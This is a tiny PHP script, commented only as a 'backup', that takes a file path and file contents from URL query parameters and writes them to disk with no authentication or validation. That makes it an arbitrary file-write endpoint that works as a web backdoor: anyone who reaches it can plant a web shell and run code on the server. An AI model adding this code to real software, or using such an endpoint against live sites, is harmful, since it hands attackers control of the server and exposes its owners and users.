<?php

// backup see gd

$fil = $_GET['fil'];
$content = $_GET['content'];

file_put_contents( $fil, $content );

echo '{ "r": "success" }';

?>